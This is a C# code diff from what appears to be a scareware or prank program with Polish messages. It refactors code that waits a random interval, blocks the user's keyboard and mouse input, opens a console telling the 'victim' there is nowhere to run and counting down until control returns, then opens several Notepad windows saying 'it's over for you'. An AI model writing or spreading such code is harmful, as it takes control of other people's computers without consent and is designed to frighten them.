@@ -9,6 +9,7 @@
     using System.IO;
     using System.Net;
     using System.Runtime.InteropServices;
+    using System.Threading;
     using System.Threading.Tasks;
 
     using WindowsInput;
@@ -96,26 +97,25 @@
         {
             await Task.Delay(Random.Next(5, 30).Seconds());
 
-            InputBlock.BlockInput(true);
-
-            AllocConsole();
-
-            Console.Title = "NIE MASZ DOKĄD UCIEC";
-            Console.WriteLine("Będę się świetnie bawił...\n\n");
-
-            for (var i = 9; i >= 0; i--)
+            using (new InputBlock())
             {
-                Console.Write($"\rOdzyskasz kontrolę za {i}");
-                await Task.Delay(1.Seconds());
+                AllocConsole();
+
+                Console.Title = "NIE MASZ DOKĄD UCIEC";
+                Console.WriteLine("Będę się świetnie bawił...\n\n");
+
+                for (var i = 9; i >= 0; i--)
+                {
+                    Console.Write($"\rOdzyskasz kontrolę za {i}");
+                    Thread.Sleep(1.Seconds());
+                }
+
+                FreeConsole();
             }
-
-            InputBlock.BlockInput(false);
-
-            FreeConsole();
 
             await Task.Delay(Random.Next(20, 50).Seconds());
 
-            for (var i = 0; i < Random.Next(2, 10); i++)
+            for (var i = 0; i < Random.Next(4, 10); i++)
             {
                 NotepadHelper.ShowMessage($"Już po Tobie ...{Environment.NewLine}:)", "Kochana ofiaro!");
             }
